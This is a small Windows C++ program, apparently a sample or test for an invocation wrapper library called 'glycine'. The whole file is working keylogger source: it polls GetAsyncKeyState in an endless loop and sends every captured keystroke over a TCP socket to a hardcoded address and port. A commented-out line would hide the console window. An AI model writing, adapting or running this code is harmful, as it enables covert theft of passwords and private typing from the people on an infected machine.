#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")

#include <glycine.hpp>

#include <string>

#define SLEEP_TIME 5
#define PORT 7878
#define IP_ADDRESS "127.0.0.1"

SOCKET SetupSocket()
{
	WSADATA wsaData;
	if (FAILED(WSAStartup(MAKEWORD(2, 2), &wsaData)))
	{
		return NULL;
	}

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		return NULL;
	}

	sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(IP_ADDRESS);
	server.sin_port = htons(PORT);

	if (connect(sock, (sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
	{
		return NULL;
	}

	return sock;
}

void CaptureKeyStrokes(SOCKET sock)
{
	std::string keystrokes;
	for (int key = 8; key <= 190; ++key)
	{
		if (GetAsyncKeyState(key) == -32767)
		{
			if (isprint((int)key) || iscntrl(key))
			{
				keystrokes += (char)key;
			}
		}
	}

	if (keystrokes.length() > 0)
	{
		send(sock, keystrokes.c_str(), (int)keystrokes.length(), 0);
	}
}

int TestMain()
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);

	SOCKET sock = glycine::Invoke<SetupSocket>();
	if (!sock)
	{
		return WSAGetLastError();
	}

	for (;;)
	{
		Sleep(SLEEP_TIME);
		glycine::Invoke<CaptureKeyStrokes>(sock);
	}
	return 0;
}

int main()
{
	return glycine::Invoke<TestMain>();
}